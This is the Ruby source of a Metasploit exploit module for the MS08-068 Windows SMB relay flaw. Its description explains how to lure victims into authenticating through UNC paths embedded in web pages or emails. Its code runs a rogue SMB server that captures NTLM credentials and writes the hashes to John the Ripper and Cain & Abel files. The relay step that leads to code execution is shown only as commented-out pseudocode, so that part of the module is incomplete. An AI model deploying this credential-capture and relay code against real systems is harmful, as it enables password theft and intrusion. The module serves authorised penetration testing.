##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

=begin
Windows XP systems that are not part of a domain default to treating all
network logons as if they were Guest. This prevents SMB relay attacks from
gaining administrative access to these systems. This setting can be found
under:

  Local Security Settings >
   Local Policies >
    Security Options >
     Network Access: Sharing and security model for local accounts
=end

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'
require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include ::Msf::Exploit::SMBHashCapture
  include ::Msf::Exploit::Remote::SMB::Server

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS08-068 Microsoft Windows SMB Relay Code Execution',
      'Description'    => %q{
          This module will relay SMB authentication requests to another
        host, gaining access to an authenticated SMB session if successful.
        If the connecting user is an administrator and network logins are
        allowed to the target machine, this module will execute an arbitrary
        payload. To exploit this, the target system	must try to	authenticate
        to this module. The easiest way to force a SMB authentication attempt
        is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or
        email message. When the victim views the web page or email, their
        system will automatically connect to the server specified in the UNC
        share (the IP address of the system running this module) and attempt
        to authenticate.  Unfortunately, this
        module is not able to clean up after itself. The service and payload
        file listed in the output will need to be manually removed after access
        has been gained. The service created by this tool uses a randomly chosen
        name and description, so the services list can become cluttered after
        repeated exploitation.

        The SMB authentication relay attack was first reported by Sir Dystic on
        March 31st, 2001 at @lanta.con in Atlanta, Georgia.

        On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin
        includes a patch which prevents the relaying of challenge keys back to
        the host which issued them, preventing this exploit from working in
        the default configuration. It is still possible to set the SMBHOST
        parameter to a third-party host that the victim is authorized to access,
        but the "reflection" attack has been effectively broken.
      },
      'Author'         =>
        [
          'hdm', # All the work
          'juan vazquez' # Add NTLMSSP support to the exploit
        ],
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Space'        => 2048,
          'DisableNops'  => true,
          'StackAdjustment' => -3500,
        },
      'References'     =>
        [
          [ 'CVE', '2008-4037'],
          [ 'OSVDB', '49736'],
          [ 'MSB', 'MS08-068'],
          [ 'URL', 'http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx'],
          [ 'URL', 'http://en.wikipedia.org/wiki/SMBRelay' ],
          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
        ],
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => '2001-03-31',
      'DefaultTarget'  => 0 ))

    register_options(
      [
        OptAddress.new('SMBHOST', [ false, "The target SMB server (leave empty for originating system)"]),
        OptString.new('SHARE',    [ true, "The share to connect to", 'ADMIN$' ])
      ])
  end


  class RelayNTLMProvider < RubySMB::Gss::Provider::NTLM
    def initialize(allow_anonymous: false, default_domain: 'WORKGROUP', listener: nil)
      super(allow_anonymous: allow_anonymous, default_domain: default_domain)
      @listener = listener
    end

    class Authenticator < HashCaptureAuthenticator
      def bin_to_hex(str)
        str.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
      end

      def process_ntlm_type1(type1_msg)
        # @client_os_version = type1_msg.os_version
        # # TODO: write method for mapping +major+ and +minor+ OS values to human-readable OS names.
        # # @client_os_version = ::NTLM::OSVersion.read(type1_msg.os_version)

        @provider.listener.relay_type1(type1_msg.sec_buff)

      end
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      Authenticator.new(self, server_client)
    end

    attr_reader :listener
  end

  def on_cred(creds)
    if active_db?
      origin = create_credential_origin_service(
        {
          address: creds[:address],
          port: datastore['SRVPORT'],
          service_name: 'smb',
          protocol: 'tcp',
          module_fullname: fullname,
          workspace_id: myworkspace_id
        }
      )

      # TODO: Re-implement when +creds[:client_os_version]+ can be determined.
      # found_host = framework.db.hosts.find_by(address: address)
      # found_host.os_name = creds[:client_os_version]
      # found_host.save!

      create_credential(
        {
          origin: origin,
          origin_type: :service,
          address: creds[:address],
          service_name: 'smb',
          port: datastore['SRVPORT'],
          private_data: creds[:combined_hash],
          private_type: :nonreplayable_hash,
          jtr_format: creds[:jtr_format],
          username: creds[:username],
          module_fullname: fullname,
          workspace_id: myworkspace_id,
          realm_key: creds[:realm_key],
          realm_value: creds[:realm_value]
        }
      )
    end

    if datastore['JOHNPWFILE']
      path = build_jtr_file_name(creds[:jtr_format])

      File.open(path, 'ab') do |f|
        f.puts(creds[:combined_hash])
      end
    end

    # Cain & Abel doesn't support import of NTLMv2 hashes
    if datastore['CAINPWFILE'] && creds[:jtr_format] == JTR_NTLMV1
      # Cain&Abel hash format
      # Username:Domain:Challenge:LMHash:NTLMHash
      File.open(File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root), 'ab') do |f|
        f.puts("#{creds[:username]}:#{creds[:domain]}:#{creds[:server_challenge]}:#{creds[:client_hash]}")
      end
    end
  end

  def run
    @rsock = Rex::Socket::Tcp.create(
      'LocalHost' => datastore['SRVHOST'],
      'LocalPort' => datastore['SRVPORT'],
      'Server' => true,
      'Timeout' => datastore['TIMEOUT'],
      'Context' =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
    )

    ntlm_provider = RelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']

    if datastore['CHALLENGE']
      # Set challenge for all future server responses

      chall = proc { [datastore['CHALLENGE']].pack('H*') }
      ntlm_provider.generate_server_challenge(&chall)
    end

    if datastore['JOHNPWFILE']
      print_status("JTR hashes will be split into two files depending on the hash format.")
      print_status("#{build_jtr_file_name(JTR_NTLMV1)} for NTLMv1 hashes.")
      print_status("#{build_jtr_file_name(JTR_NTLMV2)} for NTLMv2 hashes.")
      print_line
    end

    if datastore['CAINPWFILE']
      print_status("Cain & Abel hashes will be stored at #{File.expand_path(datastore['CAINPWFILE'], Msf::Config.install_root)}")
      print_line
    end

    server = RubySMB::Server.new(
      server_sock: @rsock,
      gss_provider: ntlm_provider
    )

    print_status("Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")

    server.run do
      print_line
      print_good 'Received SMB connection on Auth Capture Server!'
      true
    end
  end

  def cleanup

    #TODO MAKE MORE SPECIFIC

    begin
      @rsock.close if @rsock
    rescue => e
      elog('Failed closing SMB server socket', error: e)
    end

    super
  end

  # # ntlm_provider ---> relay_type1 ----> smb_client
  # #
  # def relay_type1(security_blob)
  #   spoofed_pkt = pkt + security_blob
  #
  #   make new connection
  #   on new connection, send up spoofed_pkt
  #   get response from server
  #
  #   response_sec_buff = sec_buff from response
  #
  #
  #   return response_sec_buff
  #
  #
  # end

end
